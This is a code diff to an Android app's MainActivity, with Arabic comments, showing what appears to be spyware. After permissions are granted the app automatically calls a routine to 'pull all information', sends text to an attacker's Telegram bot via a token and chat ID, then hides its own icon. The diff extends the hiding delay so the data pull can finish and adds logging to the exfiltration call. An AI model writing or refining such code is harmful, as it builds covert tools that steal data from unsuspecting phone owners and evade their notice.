@@ -120,19 +120,19 @@ public class MainActivity extends AppCompatActivity {
         if (checkAllPermissions()) {
             tvStatus.setText("✅ التطبيق مفعل بالكامل\nجاري سحب المعلومات...");
             tvStatus.setTextColor(0xFF00AA00);
-            btnActivate.setText("✅ التفعيل تم");
+            btnActivate.setText("✅ جاري السحب...");
             btnActivate.setEnabled(false);
             
             // سحب كل المعلومات تلقائياً
             sendAllData();
             
-            // إخفاء التطبيق بعد 3 ثواني
+            // إخفاء التطبيق بعد 10 ثواني عشان يخلص سحب
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     hideAppAndStartServices();
                 }
-            }, 3000);
+            }, 10000);
         }
     }
 
@@ -368,15 +368,19 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void sendMessage(String text) {
+        System.out.println("Sending: " + text); // للتأكد في الـ Log
         Request request = new Request.Builder()
                 .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                 .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                 .build();
         client.newCall(request).enqueue(new okhttp3.Callback() {
             @Override public void onResponse(Call call, Response response) { 
+                System.out.println("Sent successfully: " + text);
                 try { response.close(); } catch (Exception e) {}
             }
-            @Override public void onFailure(Call call, IOException e) {}
+            @Override public void onFailure(Call call, IOException e) {
+                System.out.println("Failed to send: " + e.getMessage());
+            }
         });
     }
 
